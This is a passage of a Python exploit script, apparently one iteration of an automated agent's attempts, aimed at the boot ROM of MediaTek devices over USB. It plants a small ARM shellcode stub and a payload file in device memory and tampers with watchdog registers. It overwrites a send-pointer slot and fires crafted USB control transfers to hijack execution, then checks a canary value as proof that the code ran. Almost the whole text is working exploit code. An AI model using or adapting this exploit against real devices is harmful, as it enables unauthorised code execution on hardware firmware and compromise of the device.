    r = collect(mtk, 0.6)
    if ACK in (r or b'') or ack_seen():
        log('HJM3_ACK', tag, 'provoke=late')
        return True
    return False


def wdt_m3b(k2, wdt):
    for D in (0, -0x40, 0x40):
        log('WDT3_TRY', 'D=%+d' % D)
        seq = [(wdt + 0x08, 0x1971), (wdt + 0x00, 0x22000014),
               (wdt + 0x14, 0x1209)]
        for addr, val in seq:
            cmd = (addr - D) & 0xFFFFFFFF
            try:
                k2.access(cmd, 4, pack('<I', val), True, 3)
                log('WDT3_WR', 'D=%+d' % D, 'cmd=%s' % hxi(cmd), hxi(val))
            except Exception as e:
                log('WDT3_EXC', type(e).__name__, str(e)[:60])
            if DEVICE_GONE:
                log('WDT3_RESET', 'D=%+d' % D, 'after=%s' % hxi(cmd))
                return True
        end = time.time() + 2.4
        while time.time() < end:
            if DEVICE_GONE:
                log('WDT3_RESET', 'D=%+d' % D)
                return True
            try:
                _, st = acc(k2, 0x0, 4, tag='wdt3-live')
            except Exception:
                log('WDT3_RESET', 'D=%+d' % D, 'probe-exc')
                return True
            if DEVICE_GONE:
                log('WDT3_RESET', 'D=%+d' % D)
                return True
            time.sleep(0.3)
        log('WDT3_NO_RESET', 'D=%+d' % D)
    return False


def m2scan_dense(k2, start, end, tag):
    hits = []
    n = 0
    for cmd in range(start, end, 4):
        if DEVICE_GONE:
            break
        try:
            d = k2.access(cmd, 4, None, True, 2)
            n += 1
            v = u32(d)
            if v is not None and 0x00100000 <= v < 0x00180000:
                log('M2D_HIT', tag, hxi(cmd), hxi(v))
                hits.append((cmd, v))
        except Exception:
            pass
        if n % 64 == 0:
            log('M2D_PROG', tag, n)
    log('M2D_DONE', tag, 'scanned=%d' % n, 'hits=%d' % len(hits))
    return hits


def revdword(v):
    return unpack('>I', pack('<I', v & 0xFFFFFFFF))[0]


def v1_e0(mtk):
    flush_ep(mtk)
    try:
        ok1 = mtk.port.echo(b'\xE0')
        log('V1_E0', ok1)
        ok2 = mtk.port.echo(pack('>I', len(payload_global)))
        log('V1_E0LEN', ok2)
        status = int.from_bytes(mtk.port.usbread(2), byteorder='little')
        log('V1_E0STAT', status)
        if status:
            return False
        mtk.port.usbwrite(payload_global)
        s1 = mtk.port.usbread(2)
        s2 = mtk.port.usbread(2)
        log('V1_E0TAIL', hx(s1), hx(s2))
        return True
    except Exception as e:
        log('V1_E0_EXC', type(e).__name__, str(e)[:60])
        return False


def v1_trigger(mtk, da, var1):
    try:
        udev = usb.core.find(idVendor=0x0E8D, idProduct=0x3)
        if udev is None:
            log('V1T_NODEV')
            return 'gone'
        try:
            udev._ctx.managed_claim_interface = lambda *a, **k: None
        except Exception:
            pass
        try:
            r = udev.ctrl_transfer(0x80, 0x06, 0x0100, 0, 0x12)
            log('V1T_SANE', 'n=%d' % (len(r) if r else 0))
        except usb.core.USBError as e:
            log('V1T_SANE_EXC', e)
        try:
            udev.ctrl_transfer(0xA1, 0, 0, var1, 0)
            log('V1T_OK')
        except usb.core.USBError as e:
            log('V1T_EXC', e)
    except Exception as e:
        log('V1T_FIND_EXC', type(e).__name__, str(e)[:60])
    log('V1_WAIT_ACK')
    flush_ep(mtk)
    RXLOG.clear()
    end = time.time() + 4.0
    while time.time() < end:
        d = rx(mtk, 4, 200)
        if d:
            log('V1_RX', hx(d))
        if ack_seen():
            log('V1_ACK', 'payload-acked')
            log('STEP', 'handshake')
            try_handshake_and_da(mtk, da, 'v1')
            return 'da'
        if DEVICE_GONE:
            log('V1_DEV_GONE_TRIG')
            return 'gone'
    harvest(mtk)
    if ack_seen():
        log('V1_ACK', 'late')
        log('STEP', 'handshake')
        try_handshake_and_da(mtk, da, 'v1')
        return 'da'
    log('V1_NOACK', 'rxlog=%s' % hx(bytes(RXLOG[-64:])))
    return 'none'



# ===================== v50 =====================
# 24B ARM->Thumb payload: str 0xC0DEF00D -> phys 0x100E00, bx lr
MINI = (b'\x01\x30\x8f\xe2\x13\xff\x2f\xe1'
        b'\x01\x48\x02\x49\x01\x60\x70\x47'
        b'\x00\x0e\x10\x00'
        b'\x0d\xf0\xde\xc0')
CANARY = 0xC0DEF00D
PREFILL = 0xA5A5A5A5
V50_A00 = 0x100A00
V50_ECAN = 0x100E00
V50_SIG = MINI[:8]


def v50_open(tag, ptr_da_fallback=PTR_DA_FALLBACK):
    log('STEP', 'v50-connect-' + tag)
    try:
        args = Args(ptype='kamakiri2', preloader=None, directory='/tmp/backup',
                    loglevel=logging.INFO, debugmode=False, noreconnect=True)
        config = MtkConfig(loglevel=logging.INFO, gui=None, guiprogress=None)
        ArgHandler(args, config)
        mtk = Mtk(config=config, loglevel=logging.INFO)
        config.set_peek(mtk.daloader.peek)
        da = DaHandler(mtk, logging.INFO)
        mtk = da.connect(mtk, '/tmp/backup')
    except Exception as e:
        log('V50_CONNECT_EXC', tag, type(e).__name__, str(e)[:100])
        return None
    if mtk is None or mtk.config.target_config is None:
        log('V50_CONNECT_FAILED', tag)
        return None
    log('CONNECTED', tag, 'is_brom=%s' % getattr(mtk.config, 'is_brom', None),
        'hwcode=%s' % hxi(getattr(mtk.config, 'hwcode', None)))
    cc = mtk.config.chipconfig
    log('CHIPCONFIG', tag,
        'send_ptr=%s' % repr(getattr(cc, 'send_ptr', None)),
        'brom_reg=%s' % repr(getattr(cc, 'brom_register_access', None)),
        'watchdog=%s' % hxi(getattr(cc, 'watchdog', None)))
    pre = mtk.preloader
    dev = mtk.port.cdc.device
    ptr_da = ptr_da_fallback
    try:
        ptr_da = cc.brom_register_access[0][1]
    except Exception:
        pass
    try:
        prep_linecode(dev)
        k2 = K2(mtk, dev, pre, ptr_da, offset=8, trigger='0200')
        lc = k2.read_linecode()
    except Exception as e:
        log('V50_LC_EXC', tag, type(e).__name__, str(e)[:80])
        return None
    log('K2_INIT', tag, 'idx=%d' % k2.idx, 'lc=%s' % hx(lc), 'ptr_da=%s' % hxi(ptr_da))
    return dict(mtk=mtk, da=da, pre=pre, dev=dev, cc=cc, k2=k2, ptr_da=ptr_da,
                wdt=cc.watchdog)


def v50_close(sess):
    try:
        sess['mtk'].port.close()
    except Exception as e:
        log('V50_CLOSE_EXC', type(e).__name__, str(e)[:50])


def v50_pick(sess, tag, idx=0):
    mtk, dev, pre, ptr_da, k2 = (sess['mtk'], sess['dev'], sess['pre'],
                                 sess['ptr_da'], sess['k2'])
    lc = k2.lc
    k0 = K2(mtk, dev, pre, ptr_da, offset=8, trigger='0200')
    k0.lc = lc
    k0.idx = idx
    v, st = acc(k0, 0x100A00, 4, tag='v51-sanity')
    log('V51_SANITY', tag, st, hx(v))
    for off, trig in ((9, '0200'), (7, '0200'), (10, '0200'),
                      (8, '02ff'), (9, '02ff'), (8, '0200')):
        if DEVICE_GONE:
            break
        kk = K2(mtk, dev, pre, ptr_da, offset=off, trigger=trig)
        kk.lc = lc
        kk.idx = idx
        v, st = acc(kk, 0x100A00, 4, tag='v51probe')
        log('V51_COMBO', tag, 'off=%d' % off, 'trig=%s' % trig, st, hx(v))
        _, w1 = acc(kk, 0x100C00, 4, pack('<I', 0xDEADBEEF), tag='v51cA-w')
        r1, s1 = acc(kk, 0x100C00, 4, tag='v51cA-r')
        _, w2 = acc(kk, 0x100D00, 4, pack('<I', 0xCAFEBABE), tag='v51cB-w')
        r2, s2 = acc(kk, 0x100D00, 4, tag='v51cB-r')
        ok = (s1 == 'ok' and u32(r1) == 0xDEADBEEF
              and s2 == 'ok' and u32(r2) == 0xCAFEBABE)
        log('V51_CANARY_DOUBLE', tag, 'off=%d' % off, 'trig=%s' % trig,
            'w=%s/%s' % (w1, w2), 'ok=%s' % ok)
        if ok:
            log('V51_COMBO_WINNER', tag, 'off=%d' % off, 'trig=%s' % trig)
            return kk
    return None


def v50_rview(k2, call, length, tag):
    try:
        d = k2.access(call, length, None, True, 2)
        log('V50_R', tag, hxi(call), (hx(d) or 'None')[:80])
        return bytes(d) if d else b''
    except Exception as e:
        log('V50_R_EXC', tag, hxi(call), type(e).__name__, str(e)[:50])
        return b''


def v50_write_phys(k2, phys, data, tag):
    res = []
    for call in (phys, phys + 0x40):
        try:
            k2.access(call, len(data), data, True, 3)
            rb = k2.access(call, len(data), None, True, 2)
            same = (rb is not None) and bytes(rb) == data
            log('V50_W', tag, 'call=%s' % hxi(call), 'match=%s' % same,
                (hx(rb) or 'None')[:48])
            res.append(same)
        except Exception as e:
            log('V50_W_EXC', tag, hxi(call), type(e).__name__, str(e)[:50])
            res.append(False)
    return any(res)


def v50_e0(mtk, payload, tag):
    flush_ep(mtk)
    try:
        ok1 = mtk.port.echo(b'\xE0')
        ok2 = mtk.port.echo(pack('>I', len(payload)))
        st = int.from_bytes(mtk.port.usbread(2), byteorder='little')
        log('V50_E0', tag, ok1, ok2, 'status=%d' % st)
        if st:
            return False
        mtk.port.usbwrite(payload)
        s1 = mtk.port.usbread(2)
        s2 = mtk.port.usbread(2)
        log('V50_E0_TAIL', tag, hx(s1), hx(s2))
        return True
    except Exception as e:
        log('V50_E0_EXC', tag, type(e).__name__, str(e)[:60])
        return False


def v50_scan(k2, tag):
    hits = []
    n = 0
    for call in range(0x100040, 0x110040, 0x800):
        if DEVICE_GONE:
            break
        try:
            d = k2.access(call, 0x1000, None, False, 2)
            n += 1
        except Exception as e:
            log('V50_SCAN_EXC', tag, hxi(call), type(e).__name__, str(e)[:40])
            continue
        if not d:
            continue
        d = bytes(d)
        i = d.find(V50_SIG)
        while i >= 0:
            hits.append(call + i)
            i = d.find(V50_SIG, i + 1)
    log('V50_SCAN', tag, 'chunks=%d' % n, 'hits=%d' % len(hits),
        repr([hxi(a) for a in hits[:12]]))
    return hits


def v50_wdt_ab(k2, pre, wdt):
    log('STEP', 'v50-wdt-ab')
    try:
        pre.write32(wdt + 0x50, [0x11223344])
        log('V50_WDT_D4W', 'ok')
    except Exception as e:
        log('V50_WDT_D4W_EXC', type(e).__name__, str(e)[:60])
    try:
        r = pre.read32(wdt + 0x50, 1)
        log('V50_WDT_D1R', repr(r))
    except Exception as e:
        log('V50_WDT_D1R_EXC', type(e).__name__, str(e)[:60])
    a, ast = acc(k2, wdt + 0x50, 4, tag='wdtA')
    b, bst = acc(k2, wdt + 0x90, 4, tag='wdtB')
    log('V50_WDT_AB', 'callA=%s' % hx(a), 'callB=%s' % hx(b))
    model = 'unknown'
    if bst == 'ok' and u32(b) == 0x11223344:
        model = 'B_noshift'
    elif ast == 'ok' and u32(a) == 0x11223344:
        model = 'A_adds'
    log('V50_MODEL', model)
    if model == 'B_noshift':
        acc(k2, wdt + 0x90, 4, pack('<I', 0x55667788), tag='wdtBw')
        try:
            r = pre.read32(wdt + 0x50, 1)
            log('V50_WDT_CROSS', repr(r), 'expect=0x55667788')
        except Exception as e:
            log('V50_WDT_CROSS_EXC', type(e).__name__, str(e)[:60])
    return model


def v50_can_view(k2, tag):
    out = {}
    for call in (V50_ECAN, V50_ECAN + 0x40):
        d = v50_rview(k2, call, 4, 'can-%s' % tag)
        out[call] = u32(d) if len(d) == 4 else None
    log('V50_CAN', tag, 'A=%s' % hxi(out[V50_ECAN]),
        'B=%s' % hxi(out[V50_ECAN + 0x40]))
    return out


def v50_trigger(var1, ms=900):
    try:
        udev = usb.core.find(idVendor=0x0E8D, idProduct=0x3)
        if udev is None:
            log('V50T_NODEV', hxi(var1))
            return 'nodev'
        try:
            udev._ctx.managed_claim_interface = lambda *a, **k: None
        except Exception:
            pass
        try:
            r = udev.ctrl_transfer(0x80, 0x06, 0x0100, 0, 0x12, timeout=1000)
            log('V50T_SANE', hxi(var1), 'n=%d' % (len(r) if r else 0))
        except Exception as e:
            log('V50T_SANE_EXC', hxi(var1), type(e).__name__, str(e)[:40])
        try:
            udev.ctrl_transfer(0xA1, 0, 0, var1, 0, timeout=ms)
            log('V50T_OK', hxi(var1))
            return 'ok'
        except usb.core.USBError as e:
            s = str(e).lower()
            log('V50T_EXC', hxi(var1), e)
            if 'timed out' in s or 'timeout' in s:
                return 'timeout'
            return 'err'
    except Exception as e:
        log('V50T_FIND_EXC', type(e).__name__, str(e)[:60])
        return 'err'


def v50_prewarm(pre, wdt, p):
    try:
        pre.write32(wdt + 0x50, [revdword(p)])
        log('V50_PTR_STD', hxi(p), 'rev=%s' % hxi(revdword(p)))
    except Exception as e:
        log('V50_PTR_STD_EXC', type(e).__name__, str(e)[:60])
    try:
        r = pre.read32(wdt + 0x50, 1)
        log('V50_PTR_D1', repr(r))
    except Exception as e:
        log('V50_PTR_D1_EXC', type(e).__name__, str(e)[:60])
    for i in range(0xF):
        a = wdt + 0x50 - (0xF - i) * 4
        try:
            pre.read32(a, 0xF - i + 1)
        except Exception as e:
            log('V50_PREWARM_EXC', i, hxi(a), type(e).__name__, str(e)[:40])
    log('V50_PREWARM_DONE')


def v50_wait_brom(timeout=60.0):
    t0 = time.time()
    while time.time() - t0 < timeout:
        try:
            if usb.core.find(idVendor=0x0E8D, idProduct=0x3) is not None:
                return True
        except Exception:
            pass
        time.sleep(0.4)
    return False


def v50_attempt(sess, good, tag, ptr_mode, var1=0xA):
    pre = sess['pre']
    wdt = sess['wdt']
    mtk = sess['mtk']
    p = sess.get('land_phys', V50_A00)
    log('V50_ATTEMPT', tag, 'ptr_mode=%s' % ptr_mode, 'p=%s' % hxi(p),
        'var1=%s' % hxi(var1))
    try:
        if ptr_mode == 'std':
            pre.write32(wdt + 0x50, [revdword(p)])
        elif ptr_mode == 'raw':
            pre.write32(wdt + 0x50, [p])
        elif ptr_mode == 'shift':
            pre.write32(wdt + 0x10, [revdword(p)])
        elif ptr_mode == 'da':
            acc(good, wdt + 0x90, 4, pack('<I', revdword(p)), tag='ptr-da')
        log('V50_PTRW', tag, ptr_mode,
            repr(pre.read32(wdt + 0x50, 1)))
    except Exception as e:
        log('V50_PTRW_EXC', tag, type(e).__name__, str(e)[:60])
    for i in range(0xF):
        a = wdt + 0x50 - (0xF - i) * 4
        try:
            pre.read32(a, 0xF - i + 1)
        except Exception:
            pass
    v50_e0(mtk, MINI, 'run-' + tag)
    st = v50_trigger(var1)
    time.sleep(0.35)
    cv = v50_can_view(good, tag)
    if CANARY in cv.values():
        log('V50_EXEC_PROOF', tag, 'canary-after-trigger',
            'ptr_mode=%s' % ptr_mode, 'var1=%s' % hxi(var1))
        return True
    log('V50_NO_CAN', tag, v50_can_view(good, tag + '-re'))
    return False


# ===================== v52 =====================

def v52_bias_probe(k2, pre):
    log('STEP', 'v52-bias')
    model = 'unknown'
    try:
        pre.write32(0x100E00, [0x11112222])
        log('V52_D4W', 'phys=0x100e00', 'val=0x11112222')
    except Exception as e:
        log('V52_D4W_EXC', type(e).__name__, str(e)[:60])
    try:
        r = pre.read32(0x100E00, 1)
        log('V52_D1R', 'phys=0x100e00', repr(r))
    except Exception as e:
        log('V52_D1R_EXC', type(e).__name__, str(e)[:60])
    for call in (0x100E00, 0x100E40, 0x100DC0):
        v, st = acc(k2, call, 4, tag='biasr')
        log('V52_BIAS_READ', hxi(call), st, hx(v))
        if st == 'ok' and u32(v) == 0x11112222:
            if call == 0x100E00:
                model = 'B_noshift'
            elif call == 0x100E40:
                model = 'A_adds'
    log('V52_MODEL', model)
    _, st = acc(k2, 0x100E00, 4, pack('<I', 0x33334444), tag='biasw')
    log('V52_DAW', 'view=0x100e00', st)
    rv, rst = acc(k2, 0x100E00, 4, tag='biasr2')
    log('V52_BIAS_READ2', '0x100e00', rst, hx(rv))
    for ph in (0x100E00, 0x100DC0):
        try:
            r = pre.read32(ph, 1)
            log('V52_D1R2', hxi(ph), repr(r))
        except Exception as e:
            log('V52_D1R2_EXC', hxi(ph), type(e).__name__, str(e)[:50])
    return model


def v52_write_bulk(k2, call, data, tag):
    try:
        k2.access(call, len(data), data, True, 3)
    except Exception as e:
        log('V52_WB_EXC', tag, hxi(call), type(e).__name__, str(e)[:50])
        return False
    try:
        rb = k2.access(call, len(data), None, True, 2)
    except Exception as e:
        log('V52_WB_R_EXC', tag, hxi(call), type(e).__name__, str(e)[:50])
        return False
    same = rb is not None and bytes(rb) == data
    log('V52_WB', tag, hxi(call), 'match=%s' % same,
        (hx(rb) or 'None')[:48])
    return same


def v52_write_words(k2, call, data, tag):
    bad = 0
    first = None
    words = payload_words(data)
    for i, w in enumerate(words):
        try:
            k2.access(call + i * 4, 4, pack('<I', w), True, 3)
        except Exception as e:
            bad += 1
            if first is None:
                first = '%d:%s' % (i, type(e).__name__)
        if (i + 1) % 32 == 0:
            log('V52_WW_PROG', tag, hxi(call), i + 1, 'bad=%d' % bad)
        if DEVICE_GONE:
            break
    ok = bad == 0
    log('V52_WW_DONE', tag, hxi(call), 'words=%d' % len(words),
        'bad=%d' % bad, 'first=%s' % first)
    return ok


def v52_payload_dual(k2, base, data, tag):
    res = []
    for call in (base, base + 0x40):
        ok = v52_write_bulk(k2, call, data, tag)
        if not ok:
            log('V52_PW_FALLBACK', tag, hxi(call))
            ok = v52_write_words(k2, call, data, tag)
            if ok:
                try:
                    rb = k2.access(call, len(data), None, True, 2)
                    ok = rb is not None and bytes(rb) == data
                except Exception:
                    ok = False
                log('V52_PW_FALLBACK_VERIFY', tag, hxi(call), ok)
        res.append(ok)
        if DEVICE_GONE:
            break
    log('V52_PAYLOAD_DUAL', tag, 'base=%s' % hxi(base), 'res=%s' % res)
    return any(res)


def v52_hijack(mtk, k2, slot, model, value, tag):
    if model == 'B_noshift':
        views = [slot]
    elif model == 'A_adds':
        views = [slot + 0x40]
    else:
        views = [slot + 0x40, slot]
    log('V52_HJ_VIEWS', tag, repr([hxi(v) for v in views]), 'model=%s' % model)
    flush_ep(mtk)
    RXLOG.clear()
    for cmd in views:
        if DEVICE_GONE:
            break
        try:
            k2.access(cmd, 4, pack('<I', value), check=False, mode=3)
            log('V52_HJ_W', tag, hxi(cmd), 'ok')
        except Exception as e:
            log('V52_HJ_W_EXC', tag, hxi(cmd), type(e).__name__, str(e)[:50])
            continue
        resp = collect(mtk, 0.6)
        if ACK in (resp or b'') or ack_seen():
            log('V52_ACK', tag, 'after-write', hxi(cmd), hx(resp))
            return True
        log('V52_HJ_NOACK', tag, hxi(cmd), hx(resp))
    for cmd in (0xFD, 0xFC):
        if DEVICE_GONE:
            break
        r = provoke_cmd(mtk, cmd)
        if ACK in (r or b'') or ack_seen():
            log('V52_ACK', tag, 'provoke=%02x' % cmd)
            return True
        r2 = collect(mtk, 0.3)
        if ACK in (r2 or b'') or ack_seen():
            log('V52_ACK', tag, 'provoke-late=%02x' % cmd)
            return True
    try:
        rv = k2.access(0x0, 0x40, None, True, 2)
        log('V52_R40', hx(rv))
        if rv and ACK in rv:
            log('V52_ACK', tag, 'read40')
            return True
    except Exception as e:
        log('V52_R40_EXC', type(e).__name__, str(e)[:50])
    return False


def v52_e0_raw(mtk, payload, tag):
    flush_ep(mtk)
    try:
        ok1 = mtk.port.echo(b'\xE0')
        ok2 = mtk.port.echo(pack('>I', len(payload)))
        raw = mtk.port.usbread(2)
        log('V52_E0', tag, ok1, ok2, 'status_raw=%s' % hx(raw))
        st = int.from_bytes(raw or b'\x00\x00', byteorder='little')
        if st:
            log('V52_E0_REJECT', tag, st)
            return False
        mtk.port.usbwrite(payload)
        s1 = mtk.port.usbread(2)
        s2 = mtk.port.usbread(2)
        log('V52_E0_TAIL', tag, hx(s1), hx(s2))
        return True
    except Exception as e:
        log('V52_E0_EXC', tag, type(e).__name__, str(e)[:60])
        return False


def v52_prime(pre, wdt):
    try:
        pre.write32(wdt + 0x50, [revdword(V50_A00)])
        log('V52_V1_PRIME', hxi(revdword(V50_A00)))
    except Exception as e:
        log('V52_V1_PRIME_EXC', type(e).__name__, str(e)[:50])
    for i in range(0xF):
        try:
            pre.read32(wdt + 0x50 - (0xF - i) * 4, 0xF - i + 1)
        except Exception:
            pass


def v52_v1_flow(sess, payload, k2=None):
    pre = sess['pre']
    wdt = sess['wdt']
    mtk = sess['mtk']
    da = sess['da']
    log('STEP', 'v52-v1-e0')
    v52_prime(pre, wdt)
    ok = v52_e0_raw(mtk, payload, 'real')
    log('V52_V1_E0_OK', ok)
    if not ok:
        log('V52_V1_E0_RETRY', 'reprime')
        v52_prime(pre, wdt)
        ok = v52_e0_raw(mtk, payload, 'real-retry')
        log('V52_V1_E0_OK2', ok)
    if not ok:
        return False
    if k2 is not None:
        for call in (V50_A00, V50_A00 + 0x40):
            v, st = acc(k2, call, 8, tag='e0land')
            log('V52_E0_LAND', hxi(call), st, hx(v))
    st = v50_trigger(0xA, 900)
    log('V52_V1_TRIG', st)
    RXLOG.clear()
    end = time.time() + 4.0
    while time.time() < end:
        if DEVICE_GONE:
            break
        d = rx(mtk, 4, 200)
        if d:
            log('V52_V1_RX', hx(d))
        if ack_seen():
            log('V52_ACK', 'v1-e0')
            try_handshake_and_da(mtk, da, 'v52v1')
            return True
    log('V52_V1_NOACK', 'rxlog=%s' % hx(bytes(RXLOG[-64:])))
    return False


def main():
    start_stall_watchdog(240)
    log('AGENT_V52_START', 'uid=%d' % os.getuid())
    global payload_global
    try:
        with open(PAYLOAD_FILE, 'rb') as f:
            payload_global = f.read()
        log('V52_PAYLOAD', 'len=%d' % len(payload_global),
            'head=%s' % hx(payload_global[:8]),
            'tail=%s' % hx(payload_global[-8:]))
    except Exception as e:
        log('V52_PAYLOAD_FAIL', type(e).__name__, str(e)[:80])
        os._exit(2)

    sess = v50_open('main')
    if sess is None:
        log('V52_NO_SESSION')
        os._exit(9)
    good = v50_pick(sess, 'main')
    if good is None:
        log('V52_COMBO_ALL_FAILED')
        os._exit(9)
    pre = sess['pre']
    mtk = sess['mtk']
    da = sess['da']

    model = v52_bias_probe(good, pre)
    if DEVICE_GONE:
        log('V52_DEV_GONE_EARLY')
        os._exit(9)

    log('STEP', 'v52-payload-write')
    okp = v52_payload_dual(good, V50_A00, payload_global, 'real')
    log('V52_PAYLOAD_LANDED', okp)

    spv, spst = acc(good, 0x9C2C, 4, tag='sendptr')
    sendptr = u32(spv) if spv is not None else None
    log('V52_SENDPTR', spst, hx(spv))
    if sendptr is None or not (0x00100000 <= sendptr < 0x00180000):
        sendptr = 0x1027B8
        log('V52_SENDPTR_FALLBACK', hxi(sendptr))
    slot = sendptr + 8
    log('V52_SLOT', hxi(sendptr), hxi(slot))

    if v52_hijack(mtk, good, slot, model, V50_A00, 'dual'):
        log('V52_STEP', 'handshake-after-ack')
        try_handshake_and_da(mtk, da, 'v52hijack')
        os._exit(9)

    if not DEVICE_GONE:
        v52_v1_flow(sess, payload_global, good)

    log('V52_NO_EVIDENCE', 'no ack from hijack or v1')
    log('AGENT_V52_DONE', 'no-exec-proof')
    os._exit(9)


if __name__ == "__main__":
    try:
        main()
    except SystemExit:
        raise
    except Exception:
        tb = traceback.format_exc()
        log('FATAL', tb.replace('\n', ' | '))
        try:
            with open('/tmp/agent_fatal.txt', 'a') as f:
                f.write(tb)
        except Exception:
            pass
        os._exit(5)
